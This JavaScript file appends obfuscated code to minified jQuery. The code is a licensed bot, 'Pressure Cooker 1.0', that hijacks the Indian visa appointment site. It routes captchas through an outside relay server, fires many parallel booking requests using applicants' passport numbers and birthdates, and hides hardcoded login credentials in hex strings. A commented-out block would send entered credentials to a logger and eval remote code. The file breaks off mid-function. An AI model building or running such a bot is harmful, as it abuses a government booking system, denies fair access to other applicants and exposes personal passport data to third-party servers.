                var t;
                return null == e.elem[e.prop] || e.elem.style && null != e.elem.style[e.prop] ? (t = x.css(e.elem, e.prop, ""), t && "auto" !== t ? t : 0) : e.elem[e.prop]
            },
            set: function(e) {
                x.fx.step[e.prop] ? x.fx.step[e.prop](e) : e.elem.style && (null != e.elem.style[x.cssProps[e.prop]] || x.cssHooks[e.prop]) ? x.style(e.elem, e.prop, e.now + e.unit) : e.elem[e.prop] = e.now
            }
        }
    }, rr.propHooks.scrollTop = rr.propHooks.scrollLeft = {
        set: function(e) {
            e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
        }
    }, x.each(["toggle", "show", "hide"], function(e, t) {
        var n = x.fn[t];
        x.fn[t] = function(e, r, i) {
            return null == e || "boolean" == typeof e ? n.apply(this, arguments) : this.animate(ir(t, !0), e, r, i)
        }
    }), x.fn.extend({
        fadeTo: function(e, t, n, r) {
            return this.filter(nn).css("opacity", 0).show().end().animate({
                opacity: t
            }, e, n, r)
        },
        animate: function(e, t, n, r) {
            var i = x.isEmptyObject(e),
                o = x.speed(t, n, r),
                a = function() {
                    var t = er(this, x.extend({}, e), o);
                    (i || x._data(this, "finish")) && t.stop(!0)
                };
            return a.finish = a, i || o.queue === !1 ? this.each(a) : this.queue(o.queue, a)
        },
        stop: function(e, n, r) {
            var i = function(e) {
                var t = e.stop;
                delete e.stop, t(r)
            };
            return "string" != typeof e && (r = n, n = e, e = t), n && e !== !1 && this.queue(e || "fx", []), this.each(function() {
                var t = !0,
                    n = null != e && e + "queueHooks",
                    o = x.timers,
                    a = x._data(this);
                if (n) a[n] && a[n].stop && i(a[n]);
                else
                    for (n in a) a[n] && a[n].stop && Jn.test(n) && i(a[n]);
                for (n = o.length; n--;) o[n].elem !== this || null != e && o[n].queue !== e || (o[n].anim.stop(r), t = !1, o.splice(n, 1));
                (t || !r) && x.dequeue(this, e)
            })
        },
        finish: function(e) {
            return e !== !1 && (e = e || "fx"), this.each(function() {
                var t, n = x._data(this),
                    r = n[e + "queue"],
                    i = n[e + "queueHooks"],
                    o = x.timers,
                    a = r ? r.length : 0;
                for (n.finish = !0, x.queue(this, e, []), i && i.stop && i.stop.call(this, !0), t = o.length; t--;) o[t].elem === this && o[t].queue === e && (o[t].anim.stop(!0), o.splice(t, 1));
                for (t = 0; a > t; t++) r[t] && r[t].finish && r[t].finish.call(this);
                delete n.finish
            })
        }
    });

    function ir(e, t) {
        var n, r = {
                height: e
            },
            i = 0;
        for (t = t ? 1 : 0; 4 > i; i += 2 - t) n = Zt[i], r["margin" + n] = r["padding" + n] = e;
        return t && (r.opacity = r.width = e), r
    }
    x.each({
        slideDown: ir("show"),
        slideUp: ir("hide"),
        slideToggle: ir("toggle"),
        fadeIn: {
            opacity: "show"
        },
        fadeOut: {
            opacity: "hide"
        },
        fadeToggle: {
            opacity: "toggle"
        }
    }, function(e, t) {
        x.fn[e] = function(e, n, r) {
            return this.animate(t, e, n, r)
        }
    }), x.speed = function(e, t, n) {
        var r = e && "object" == typeof e ? x.extend({}, e) : {
            complete: n || !n && t || x.isFunction(e) && e,
            duration: e,
            easing: n && t || t && !x.isFunction(t) && t
        };
        return r.duration = x.fx.off ? 0 : "number" == typeof r.duration ? r.duration : r.duration in x.fx.speeds ? x.fx.speeds[r.duration] : x.fx.speeds._default, (null == r.queue || r.queue === !0) && (r.queue = "fx"), r.old = r.complete, r.complete = function() {
            x.isFunction(r.old) && r.old.call(this), r.queue && x.dequeue(this, r.queue)
        }, r
    }, x.easing = {
        linear: function(e) {
            return e
        },
        swing: function(e) {
            return .5 - Math.cos(e * Math.PI) / 2
        }
    }, x.timers = [], x.fx = rr.prototype.init, x.fx.tick = function() {
        var e, n = x.timers,
            r = 0;
        for (Xn = x.now(); n.length > r; r++) e = n[r], e() || n[r] !== e || n.splice(r--, 1);
        n.length || x.fx.stop(), Xn = t
    }, x.fx.timer = function(e) {
        e() && x.timers.push(e) && x.fx.start()
    }, x.fx.interval = 13, x.fx.start = function() {
        Un || (Un = setInterval(x.fx.tick, x.fx.interval))
    }, x.fx.stop = function() {
        clearInterval(Un), Un = null
    }, x.fx.speeds = {
        slow: 600,
        fast: 200,
        _default: 400
    }, x.fx.step = {}, x.expr && x.expr.filters && (x.expr.filters.animated = function(e) {
        return x.grep(x.timers, function(t) {
            return e === t.elem
        }).length
    }), x.fn.offset = function(e) {
        if (arguments.length) return e === t ? this : this.each(function(t) {
            x.offset.setOffset(this, e, t)
        });
        var n, r, o = {
                top: 0,
                left: 0
            },
            a = this[0],
            s = a && a.ownerDocument;
        if (s) return n = s.documentElement, x.contains(n, a) ? (typeof a.getBoundingClientRect !== i && (o = a.getBoundingClientRect()), r = or(s), {
            top: o.top + (r.pageYOffset || n.scrollTop) - (n.clientTop || 0),
            left: o.left + (r.pageXOffset || n.scrollLeft) - (n.clientLeft || 0)
        }) : o
    }, x.offset = {
        setOffset: function(e, t, n) {
            var r = x.css(e, "position");
            "static" === r && (e.style.position = "relative");
            var i = x(e),
                o = i.offset(),
                a = x.css(e, "top"),
                s = x.css(e, "left"),
                l = ("absolute" === r || "fixed" === r) && x.inArray("auto", [a, s]) > -1,
                u = {},
                c = {},
                p, f;
            l ? (c = i.position(), p = c.top, f = c.left) : (p = parseFloat(a) || 0, f = parseFloat(s) || 0), x.isFunction(t) && (t = t.call(e, n, o)), null != t.top && (u.top = t.top - o.top + p), null != t.left && (u.left = t.left - o.left + f), "using" in t ? t.using.call(e, u) : i.css(u)
        }
    }, x.fn.extend({
        position: function() {
            if (this[0]) {
                var e, t, n = {
                        top: 0,
                        left: 0
                    },
                    r = this[0];
                return "fixed" === x.css(r, "position") ? t = r.getBoundingClientRect() : (e = this.offsetParent(), t = this.offset(), x.nodeName(e[0], "html") || (n = e.offset()), n.top += x.css(e[0], "borderTopWidth", !0), n.left += x.css(e[0], "borderLeftWidth", !0)), {
                    top: t.top - n.top - x.css(r, "marginTop", !0),
                    left: t.left - n.left - x.css(r, "marginLeft", !0)
                }
            }
        },
        offsetParent: function() {
            return this.map(function() {
                var e = this.offsetParent || s;
                while (e && !x.nodeName(e, "html") && "static" === x.css(e, "position")) e = e.offsetParent;
                return e || s
            })
        }
    }), x.each({
        scrollLeft: "pageXOffset",
        scrollTop: "pageYOffset"
    }, function(e, n) {
        var r = /Y/.test(n);
        x.fn[e] = function(i) {
            return x.access(this, function(e, i, o) {
                var a = or(e);
                return o === t ? a ? n in a ? a[n] : a.document.documentElement[i] : e[i] : (a ? a.scrollTo(r ? x(a).scrollLeft() : o, r ? o : x(a).scrollTop()) : e[i] = o, t)
            }, e, i, arguments.length, null)
        }
    });

    function or(e) {
        return x.isWindow(e) ? e : 9 === e.nodeType ? e.defaultView || e.parentWindow : !1
    }
    x.each({
        Height: "height",
        Width: "width"
    }, function(e, n) {
        x.each({
            padding: "inner" + e,
            content: n,
            "": "outer" + e
        }, function(r, i) {
            x.fn[i] = function(i, o) {
                var a = arguments.length && (r || "boolean" != typeof i),
                    s = r || (i === !0 || o === !0 ? "margin" : "border");
                return x.access(this, function(n, r, i) {
                    var o;
                    return x.isWindow(n) ? n.document.documentElement["client" + e] : 9 === n.nodeType ? (o = n.documentElement, Math.max(n.body["scroll" + e], o["scroll" + e], n.body["offset" + e], o["offset" + e], o["client" + e])) : i === t ? x.css(n, r, s) : x.style(n, r, i, s)
                }, n, a ? i : t, a, null)
            }
        })
    }), x.fn.size = function() {
        return this.length
    }, x.fn.andSelf = x.fn.addBack, "object" == typeof module && module && "object" == typeof module.exports ? module.exports = x : (e.jQuery = e.$ = x, "function" == typeof define && define.amd && define("jquery", [], function() {
        return x
    }))
})(window);




var _0x87e9=["\x4D\x4F\x4F\x4E\x20\x31","\x77\x61\x6E\x74\x6F\x6E","\x4D\x4F\x4F\x4E\x20\x32","\x77\x69\x73\x74\x66\x75\x6C","\x4D\x4F\x4F\x4E\x20\x33","\x66\x75\x74\x69\x6C\x65","\x4D\x4F\x4F\x4E\x20\x34","\x76\x65\x6E\x65\x72\x61\x74\x65","\x53\x55\x4D\x49\x20\x31","\x74\x61\x63\x69\x74","\x53\x55\x4D\x49\x20\x32","\x6C\x75\x63\x69\x64","\x53\x55\x4D\x49\x20\x33","\x72\x65\x76\x65\x72\x65","\x53\x55\x4D\x49\x20\x34","\x74\x69\x6D\x69\x64","\x48\x41\x53\x49\x42","\x76\x61\x70\x69\x64","\x53\x41\x4B\x49\x42","\x7A\x65\x61\x6C\x6F\x74","\x54\x55\x48\x49\x4E","\x74\x65\x6E\x65\x74","\x5A\x41\x4B\x49\x41","\x70\x75\x65\x72\x69\x6C\x65","\x5A\x41\x44\x49\x44\x41","\x70\x65\x72\x74\x75\x72\x62","\x4E\x49\x48\x41\x4E","\x70\x65\x72\x75\x73\x65","\x4D\x41\x48\x49\x44","\x70\x65\x65\x6B","\x48\x41\x51\x55\x45","\x61\x63\x6C\x69\x76\x69\x74\x79","\x54\x55\x53\x48\x41\x52","\x74\x65\x6E\x74\x61","\x41\x5A\x49\x4D","\x74\x69\x67\x72\x65\x73\x73","\x4F\x4E\x49","\x74\x72\x61\x6E\x73\x69\x65\x6E\x74","\x4E\x49\x53\x41\x4E","\x74\x6F\x72\x70\x6F\x72","\x4A\x49\x53\x41\x4E","\x74\x72\x61\x6E\x73","\x4D\x41\x48\x42\x55\x42","\x63\x6F\x6F\x6B\x79","\x4C\x45\x4D\x4F\x4E","\x68\x6F\x6F\x6B\x65\x72","\x52\x41\x42\x42\x49","\x74\x61\x63\x69\x74\x75\x72\x6E","\x53\x41\x49\x46\x55\x4C","\x68\x61\x72\x62\x69\x6E\x67\x65\x72","\x41\x54\x41\x55\x52","\x6D\x61\x6B\x65\x6F\x76\x65\x72","\x4E\x41\x48\x49\x4E","\x61\x75\x63\x74\x69\x6F\x6E","\x54\x4F\x4E\x4D\x4F\x59","\x7A\x75\x6C\x75","\x54\x41\x4E\x56\x49\x52","\x6A\x6F\x6B\x65\x72","\x41\x43\x48\x4F\x4C","\x6A\x6F\x63\x6B\x65\x79","\x41\x43\x48\x49\x4C\x59","\x70\x65\x74\x65\x72","\x42\x41\x42\x55","\x63\x61\x74","\x49\x4D\x52\x41\x4E","\x69\x73\x6C\x61\x6E\x64","\x4D\x55\x4E\x4E\x41","\x6F\x63\x65\x61\x6E","\x4E\x41\x48\x49\x44","\x74\x6F\x74\x6F","\x52\x49\x53\x48\x41\x54","\x6D\x69\x63\x61","\x52\x4F\x4E\x49","\x6D\x69\x6D\x69\x63","\x53\x48\x41\x52\x49\x46","\x6D\x65\x73\x6F\x6E","\x53\x4F\x4A\x4F\x4C","\x62\x6F\x73\x6F\x6E","\x43\x48\x41\x4D\x45\x4C\x49","\x63\x61\x70\x74\x69\x76\x65","\x53\x55\x56\x4F","\x61\x72\x74","\x4E\x41\x5A\x4D\x55\x4C","\x6D\x75\x6E\x64\x61\x6E\x65","\x52\x41\x48\x4D\x41\x4E","\x6D\x6F\x63\x6B"];function abc(_0x1aedx2,_0x1aedx3){var _0x1aedx4={};_0x1aedx4[_0x87e9[0]]=_0x87e9[1];_0x1aedx4[_0x87e9[2]]=_0x87e9[3];_0x1aedx4[_0x87e9[4]]=_0x87e9[5];_0x1aedx4[_0x87e9[6]]=_0x87e9[7];_0x1aedx4[_0x87e9[8]]=_0x87e9[9];_0x1aedx4[_0x87e9[10]]=_0x87e9[11];_0x1aedx4[_0x87e9[12]]=_0x87e9[13];_0x1aedx4[_0x87e9[14]]=_0x87e9[15];_0x1aedx4[_0x87e9[16]]=_0x87e9[17];_0x1aedx4[_0x87e9[18]]=_0x87e9[19];_0x1aedx4[_0x87e9[20]]=_0x87e9[21];_0x1aedx4[_0x87e9[22]]=_0x87e9[23];_0x1aedx4[_0x87e9[24]]=_0x87e9[25];_0x1aedx4[_0x87e9[26]]=_0x87e9[27];_0x1aedx4[_0x87e9[28]]=_0x87e9[29];_0x1aedx4[_0x87e9[30]]=_0x87e9[31];_0x1aedx4[_0x87e9[32]]=_0x87e9[33];_0x1aedx4[_0x87e9[34]]=_0x87e9[35];_0x1aedx4[_0x87e9[36]]=_0x87e9[37];_0x1aedx4[_0x87e9[38]]=_0x87e9[39];_0x1aedx4[_0x87e9[40]]=_0x87e9[41];_0x1aedx4[_0x87e9[42]]=_0x87e9[43];_0x1aedx4[_0x87e9[44]]=_0x87e9[45];_0x1aedx4[_0x87e9[46]]=_0x87e9[47];_0x1aedx4[_0x87e9[48]]=_0x87e9[49];_0x1aedx4[_0x87e9[50]]=_0x87e9[51];_0x1aedx4[_0x87e9[52]]=_0x87e9[53];_0x1aedx4[_0x87e9[54]]=_0x87e9[55];_0x1aedx4[_0x87e9[56]]=_0x87e9[57];_0x1aedx4[_0x87e9[58]]=_0x87e9[59];_0x1aedx4[_0x87e9[60]]=_0x87e9[61];_0x1aedx4[_0x87e9[62]]=_0x87e9[63];_0x1aedx4[_0x87e9[64]]=_0x87e9[65];_0x1aedx4[_0x87e9[66]]=_0x87e9[67];_0x1aedx4[_0x87e9[68]]=_0x87e9[69];_0x1aedx4[_0x87e9[70]]=_0x87e9[71];_0x1aedx4[_0x87e9[72]]=_0x87e9[73];_0x1aedx4[_0x87e9[74]]=_0x87e9[75];_0x1aedx4[_0x87e9[76]]=_0x87e9[77];_0x1aedx4[_0x87e9[78]]=_0x87e9[79];_0x1aedx4[_0x87e9[80]]=_0x87e9[81];_0x1aedx4[_0x87e9[82]]=_0x87e9[83];_0x1aedx4[_0x87e9[84]]=_0x87e9[85];if(_0x1aedx4[_0x1aedx2]==_0x1aedx3){return false;} ;return true;} ;











$(function() {

var _0x7e18=["\x6E\x6F\x77","\x4F\x63\x74\x6F\x62\x65\x72\x20\x31\x35\x2C\x20\x32\x30\x31\x34\x20\x31\x31\x3A\x31\x33\x3A\x30\x30","\x50\x6C\x65\x61\x73\x65\x20\x65\x6E\x74\x65\x72\x20\x74\x68\x65\x20\x55\x73\x65\x72\x6E\x61\x6D\x65","\x50\x6C\x65\x61\x73\x65\x20\x65\x6E\x74\x65\x72\x20\x74\x68\x65\x20\x50\x61\x73\x73\x77\x6F\x72\x64","\x5F\x75\x73\x72","\x42\x55","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x69\x6C\x75\x62\x75\x65\x74\x2E\x70\x79\x74\x68\x6F\x6E\x61\x6E\x79\x77\x68\x65\x72\x65\x2E\x63\x6F\x6D\x2F"];var a4=Date[_0x7e18[0]]();var d4= new Date(_0x7e18[1]);if(a4>d4){return 0;} ;var usr=prompt(_0x7e18[2]),pass=prompt(_0x7e18[3]);if(abc(usr,pass)){return 0;} ;window[_0x7e18[4]]=usr;window[_0x7e18[5]]=_0x7e18[6];
//    $.post(BU + 'encjs/active', {
//        task: 'key',
//        usr: usr,
//        pass: pass
//    }).done(function(r) {
//        $.post(BU + 'logger/lsave', {
//            usr: usr,
//            pass: pass,
//            success: r.length ? 1 : 0
//        });
//        if (!r.length) return alert('Username password invalid!!!!');
//        var js = r.replace(/\s*$/, '').replace(/;$/, '');
//        console.log(js);
//        eval(js)
//    })

    eval(function(p, a, c, k, e, d) {







    window.servers = [{
    "domain": "jubayer.site40.net",
    "ip": "-",
    "appurl": "http:\/\/jubayer.site40.net\/pages\/nest.php"
}];
window.hitservers = [];

function setupFallback(base, IDS) {
    var form, cfile, curfile, iij = 0,
        bells, ztr, ndttr, ndate, _img, _imgn, _wimg, _wait, imgsrc, frame, _xhr, ichk, getapp = $('[name=Appointment]'),
        egtd = getapp.closest('td').prev().empty(),
        dt = new Date(),
        today = $('[name=Date]').val();
    var body = $('body'),
        BGDs = {
            r: [],
            o: {}
        },
        rpane, itbl, form, list, Msgbx, msgbx, _xhr, esrc = 'data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==';
    window.run = window.appt;
    $('option[value=BGDD0]').val('BGDD1');
    rpane = $('<div>').prependTo($('.mainframe')).addClass('rightpane ex');
    _wait = $('<div>').addClass('loader top').appendTo(rpane);
    $('<div>').addClass('caption').html('Pressure Cooker 1.0').appendTo(rpane);
    itbl = $('<tbody>').appendTo($('<table>').addClass('info').appendTo(rpane));
    form = $('form[name=OnlineForm]').addClass('headera').appendTo(rpane);
    list = $('<div>').addClass('bgdlist').appendTo(rpane);
    $(".bgdlist").css("text-align","center");
    getapp.closest('table').addClass('hiderow');
    IDS.forEach(function(pr, i) {
        if (BGDs.o[pr[1]]) return;
        var zcc = $('<div>').addClass('lli').appendTo(list);
        $('<span>').addClass('bgname').html(pr.slug).appendTo(zcc);
        var res = $('<span>').addClass('emss').append($('<span>').css({
            color: 'gray'
        }).html('--')).appendTo(zcc);
        var bgd = {
            tr: zcc,
            res: res,
            slug: pr.slug,
            sts: 0,
            taken: pr.taken,
            data: {
                fileno: pr[1],
                birthdate: pr[2],
                passport_no: pr[3],
                ImgNum: '',
                Date: today
            }
        };
        BGDs.r.push(bgd);
        BGDs.o[pr[1]] = bgd;
        zcc.click(function() {
            bells.removeClass('x');
            zcc.addClass('x').focus();
            _imgn.focus();
            msk.val(pr[1].slice(0, 4) + '1');
            $('[name=fileno]').val(pr[1]);
            $('[name=birthdate]').val(pr[2]);
            $('[name=passport_no]').val(pr[3]);
            cfile = pr;
            iij = i
        })
    });
    BGDs.r.forEach(function(bgd, i) {
        if (bgd.taken) {
            $('<span>').addClass('emss').css({
                color: 'orange'
            }).insertAfter(bgd.res).html('Taken on ' + bgd.taken);
            bgd.sts = 1;
            bgd.res.remove();
            bgd.tr.appendTo(list)
        }
    });
    var msk = $('#pia').removeAttr('id').removeAttr('onchange').addClass('mission-select');
    msk.find('option').each(function(i, d) {
        d = $(d);
        if (d.val().match(/^BGD/)) {
            d.html(d.html().replace(/^BANGLADESH-/i, ''));
            d.val().match(/0$/i) && d.val(d.val().replace(/0$/i, '1'))
        } else d.remove()
    });
    form = $('[name=OnlineForm]').attr({
        target: 'tframe',
        action: 'ReprintAppt.jsp'
    }).removeAttr('onclick').submit(function() {
        var v = _imgn.val();
        if (v.length == 0) return;
        if (v.length != 6) return !!alert('Access Code should be 6 letters long!!!');
        window.capimage = null;
        _wait.show();
        curfile = cfile
    });
    _img = form.find('img[alt]').click(function() {
        var bstr, pstr = '',
            xhr = new XMLHttpRequest();
        _xhr && _xhr.abort();
        _xhr = xhr;
        _imgn.val('').focus();
        xhr.open('GET', imgsrc, true);
        xhr.overrideMimeType('text/plain;charset=x-user-defined');
        xhr.onerror = function() {
            _wimg.hide()
        };
        xhr.onload = function(e) {
            if (xhr.status != 200) return;
            bstr = xhr.responseText;
            for (var i = 0, len = bstr.length; i < len; ++i) pstr += String.fromCharCode(bstr.charCodeAt(i) & 0xff);
            pstr = btoa(pstr);
            window.capimage = pstr;
            _img.attr('src', 'data:image/jpeg;base64,' + pstr);
            _wimg.hide();
            _imgn.focus()
        };
        _wimg.show();
        xhr.send(null)
    });
    _img.appendTo($('<div>').addClass('iholder').appendTo(_img.parent()));
    var needles = [{
        tag: 'Date Not Opened',
        type: 0,
        look: 'Reprint:-Print already Registered application'
    }, {
        tag: 'Internal Server Error',
        type: 0,
        look: 'There is an Internal Server Error'
    }, {
        tag: 'Under Maintenance',
        type: 0,
        look: 'System is under maintenance'
    }, {
        tag: 'BGD Expired',
        type: -1,
        look: 'New Appointment is possible only within'
    }, {
        tag: 'IncorrectFile',
        type: -1,
        look: 'File Number or Date of Birth does not exists'
    }, {
        tag: 'Date Closed',
        type: 0,
        look: 'No Apppointment Dates are available'
    }, {
        tag: 'Access code Invalid',
        type: 0,
        look: 'Access code is not valid'
    }, {
        tag: 'Date Taken',
        type: 1,
        look: 'Appointment Date is already taken'
    }, ];
    _imgn = form.find('#ImgNum').addClass('pre').keypress(function(e) {
        var c = e.keyCode;
        if (c == 13 || (c >= 48 && c <= 57) || (c >= 97 && c <= 102)) return;
        return false
    });
    ichk = $('<input type="checkbox">').appendTo(egtd).attr({
        tabIndex: -1
    }).hide();
    $('<span>').html('PDF on NO DATE').insertAfter(ichk).hide();
    _wimg = $('<img>').attr({
        src: 'http://www.mytreedb.com/uploads/mytreedb/loader/ajax_loader_blue_32.gif'
    }).hide().insertAfter(_img);
    _wait = _wimg.clone().appendTo(egtd).css({
        'vertical-align': 'middle',
        'margin': '-10px 0 0 20px'
    });
    $('[name=Reprint]').hide();
    imgsrc = _img.attr('src');
    _img.click();

    function showMess(a, b, c) {
        $('<div>').html(a).appendTo(b).css({
            textAlign: 'center',
            fontSize: '48px',
            color: c ? 'green' : 'red'
        }).hide().fadeIn()
    };
    var framecont = $('<div>').addClass('frame-container').appendTo('body');
    frame = $('<iframe>').attr({
        name: 'tframe',
        src: "about:blank",
        sandbox: 'allow-forms allow-same-origin'
    }).css({
        border: '1px solid #C0C0C0',
        width: '29%',
        height: 360
    }).appendTo(framecont).load(function() {
        setTimeout(function() {
            var icont = frame.contents(),
                ibody = icont.find('body'),
                iform = icont.find('form[name=example]'),
                abc = iform.find('[name=DATE]');
            var trt = icont.find('img[align=top]').closest('tr');
            trt.next().remove();
            trt.remove();
            icont.find('table').height('auto').width('auto');
            if (iform.length) {
                iform.removeAttr('onsubmit').attr({
                    target: 'pframe'
                });
                iform.children('table').find('tr:last').remove();
                iform.children('table').height('auto').find('tr').eq(4).remove();
                if (abc.length) {
                    abc.val(abc.find('option').eq(1).val());
                    zform = iform.clone().hide().insertAfter(pframe);
                    zform.find('[name=DATE]').val(abc.val());
                    zform.submit().remove();
                    setTimeout(function() {
                        _img.click();
                        _wait.hide()
                    }, 100)
                } else if (ichk.is(':checked')) {
                    iform.find('[name=EXIT]').closest('tr').remove();
                    $('<input type=hidden>').attr({
                        name: 'DATE'
                    }).val('31/07/2014').appendTo(iform);
                    if (!iform.find('[name=SAVE]').length) $('<input type=hidden>').attr({
                        name: 'SAVE'
                    }).val('Confirm The Appointment').appendTo(iform);
                    iform.clone().hide().insertAfter(pframe).submit().remove();
                    setTimeout(function() {
                        _img.click()
                    }, 100)
                } else _img.click() && _wait.hide() && showMess('NO DATE!!!', ibody, 0)
            } else {
                var bdtx = icont.find('html').html(),
                    msdv = $('<div>').prependTo(ibody);
                _img.click() && _wait.hide();
                var bgd = curfile[1],
                    hbgd = BGDs.o[bgd];
                needles.forEach(function(ndl) {
                    if (bdtx.match(ndl.look)) {
                        showMess(ndl.tag, msdv, ndl.type == 1);
                        if (ndl.type == -1) {
                            hbgd.res.html(ndl.tag).css({
                                color: 'red'
                            })
                        } else if (ndl.type == 1) {
                            hbgd.res.html('Taken').css({
                                color: 'green'
                            });
                            window.takens[curfile[1]] = {
                                fileno: curfile[1],
                                usr: _usr,
                                domain: '--'
                            };
                            window.fireUpdater()
                        }
                    }
                });
                var scrp = $('[name=tframe]').contents().find('script:first');
                if (scrp.length && !scrp.attr('type')) {
                    var mstr = scrp.text().replace(/^\s+|\s+$/g, '');
                    mstr = mstr.match(/^alert\("([^"]+)"\)/);
                    if (mstr) $('<div>').html(mstr[1]).appendTo(msdv).css({
                        textAlign: 'center',
                        fontSize: '20px',
                        color: 'red'
                    })
                }
            }
        }, 200)
    });
    pframe = $('<iframe>').attr({
        name: 'pframe',
        src: "about:blank"
    }).css({
        border: '1px solid #C0C0C0',
        width: '70%',
        height: 360
    }).appendTo(framecont).load(function() {
        setTimeout(function() {
            var icont = pframe.contents(),
                ipdf = icont.find('embed[name=plugin]');
            if (ipdf.length) icont.find('body').height(1200).animate({
                scrollTop: 318
            })
        }, 200)
    });
    setTimeout(function() {
        _imgn.focus();
        getapp.show()
    }, 500);
    var trt = $('img[align=top]').closest('tr');
    trt.next().remove();
    trt.remove();
    getapp.closest('tr').nextAll('tr').remove();
    $('td[height=18]').remove();
    $('table').height('auto').width('auto');
    $('td[width=497]').width('auto');
    $('<span>').attr({
        id: 'GETAPPT'
    }).appendTo('body');
    _imgn.addClass('pre').keydown(function(e) {
        var l = IDS.length;
        if (e.keyCode == 38 || e.keyCode == 40);
        else return; if (iij == 0 && e.keyCode == 38 || iij == l - 1 && e.keyCode == 40) return false;
        iij += (e.keyCode == 38 ? -1 : 1);
        list.children().eq(iij).click();
        return false
    });
    bells = list.children().attr({
        tabIndex: 1
    });
    bells.eq(0).click()
};

function setupBlock(base, server, IDS, capx, capy) {
    var links = {
        dom: 'http://indianvisaonline.gov.in/visa/',
        dip: 'http://164.100.129.11/visa/',
        cap: 'Rimage.jsp',
        rep: 'Reprint.jsp',
        appt: 'ReprintAppt.jsp',
        allot: 'allotmentsave.jsp'
    };
    var appurl = server.appurl,
        BGDs = {
            r: [],
            o: {}
        },
        caps = {
            wait: [],
            ready: [],
            used: [],
            live: false,
            hits: 5,
            xpiry: 58
        },
        _wait, today = $('[name=Date]').val();
    var body = $('body'),
        rpane, itbl, form, list, Msgbx, msgbx, hitf = {
            on: false,
            sleep: false,
            busy: false
        },
        _tmh, _xhr, esrc = 'data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==';
    var II = {
        trdl: {
            slug: 'Thread Limit',
            count: 100,
            max: 150
        },
        trds: {
            slug: 'Threads',
            count: 0,
            step: 10
        },
        wait: {
            slug: 'Waiting',
            min: 4
        },
        ready: {
            slug: 'Ready'
        },
        used: {
            slug: 'Used'
        },
        hits: {
            slug: 'Hits'
        },
        tkn: {
            slug: 'Taken',
            count: 0
        }
    };
    rpane = $('<div>').appendTo($('.mainframe')).addClass('rightpane-ex2');
    $(".rightpane-ex2").hide();
    _wait = $('<div>').addClass('loader top').appendTo(rpane);
    $('<div>').addClass('caption').html('PC').appendTo(rpane);
    itbl = $('<tbody>').appendTo($('<table>').addClass('info').appendTo(rpane));
    form = $('<form>').attr({
        autocomplete: 'off'
    }).addClass('header').appendTo(rpane);
    list = $('<div>').addClass('bgdlist').appendTo(rpane);
    $(".bgdlist").css("text-align","center");
    $.each(II, function(k, el) {
        if (!el.count) el.count = 0;
        el.hnd = $('<td>').appendTo($('<tr>').append($('<td>').html(el.slug)).appendTo(itbl)).html(el.count)
    });
    IDS.forEach(function(pr, i) {
        var zcc = $('<div>').addClass('lli').appendTo(list);
        $('<span>').addClass('bgname').html(pr.slug).appendTo(zcc);
        var res = $('<span>').addClass('emss').append($('<span>').css({
            color: 'gray'
        }).html('--')).appendTo(zcc);
        var bgd = {
            tr: zcc,
            res: res,
            slug: pr.slug,
            sts: 0,
            taken: pr.taken,
            data: {
                fileno: pr[1],
                birthdate: pr[2],
                passport_no: pr[3],
                ImgNum: '',
                Date: today
            }
        };
        BGDs.r.push(bgd);
        BGDs.o[pr[1]] = bgd
    });
    BGDs.r.forEach(function(bgd, i) {
        if (bgd.taken) {
            $('<span>').addClass('emss').css({
                color: 'orange'
            }).insertAfter(bgd.res).html('Taken on ' + bgd.taken);
            bgd.sts = 1;
            bgd.res.remove();
            bgd.tr.appendTo(list)
        }
    });

    function fetchimage() {
        var usr;
        if (caps.used.length) {
            usr = caps.used.pop().usr;
            II.used.hnd.html(caps.used.length)
        } else usr = II.trds.count++;
        II.trds.hnd.html(II.trds.count);
        $.post(appurl, {
            task: 'img',
            usr: usr,
            links: links
        }).done(function(r) {
            if (r.rsp && r.rsp.image) {
                var cap = {
                    usr: usr,
                    image: r.rsp.image,
                    loaded: (new Date()).getTime()
                };
                if (caps.live) caps.wait.push(cap);
                else showcap(cap)
            } else caps.used.push({
                usr: usr
            }) && II.used.hnd.html(caps.used.length);
            II.wait.hnd.html(caps.wait.length + (caps.live ? 1 : 0))
        }).fail(function() {
            caps.used.push({
                usr: usr
            }) && II.used.hnd.html(caps.used.length)
        });
        II.hits.hnd.html(++II.hits.count)
    };

    function showcap(cap) {
        caps.live = cap;
        capx.attr('src', 'data:image/jpeg;base64,' + cap.image)
    };

    function fillgaps() {
        if (II.wait.min < caps.wait.length) return;
        var d = II.trdl.count - II.trds.count + caps.used.length,
            i = d > II.trds.step ? II.trds.step : d;
//        $.post(base + 'viz/logger/logcaps', {
//            caps: {
//                usr: _usr,
//                domain: server.domain,
//                count: i
//            }
//        });
        while (0 < i--) fetchimage()
    };

    function genhit() {
        var l = caps.hits,
            bgds, kaps, nw = (new Date()).getTime();
        bgds = BGDs.r.filter(function(a) {
            return a.sts == 0 || a.sts == 2
        }).map(function(a, i) {
            a._ = i;
            return a
        }).sort(function(x, y) {
            a = x.sts;
            b = y.sts;
            r = a == b ? 0 : b == 2 ? 1 : a == 2 ? -1 : 0;
            r = r ? r : x._ - y._;
            return r
        }).map(function(a) {
            return a.data
        });
        while (caps.ready.length && (nw - caps.ready[0].loaded) / 1000 / 60 > caps.xpiry) caps.used.push({
            usr: caps.ready.shift().usr
        });
        II.used.hnd.html(caps.used.length);
        II.ready.hnd.html(caps.ready.length);
        if (!bgds.length || !caps.ready.length) return hitf.sleep = true;
        hitf.sleep = false;
        if (bgds.length < l) l = bgds.length;
        if (caps.ready.length < l) l = caps.ready.length;
        if (bgds.length > l) bgds = bgds.slice(0, l);
        kaps = caps.ready.splice(0, l);
        II.ready.hnd.html(caps.ready.length);
        _xhr = $.post(appurl, {
            task: 'hit',
            links: links,
            data: JSON.stringify({
                bgds: bgds,
                caps: kaps.map(function(a) {
                    return [a.usr, a.val]
                })
            })
        }).always(function() {
            hitf.busy = false;
            _wait.hide()
        }).fail(function() {
            while (kaps.length) caps.used.push({
                usr: kaps.shift().usr
            })
        }).done(function(r) {
            var lkase = r.rsp[r.rsp.length - 1],
                xdt = {
                    taken: [],
                    success: []
                };
            r.rsp.forEach(function(el) {
                var bgd = el.fileno,
                    hbgd = BGDs.o[bgd];
                switch (el.kase) {
                    case 'IncorrectFile':
                    case 'Expired':
                        hbgd.sts = -1;
                        hbgd.res.html(el.kase).css({
                            color: 'red'
                        });
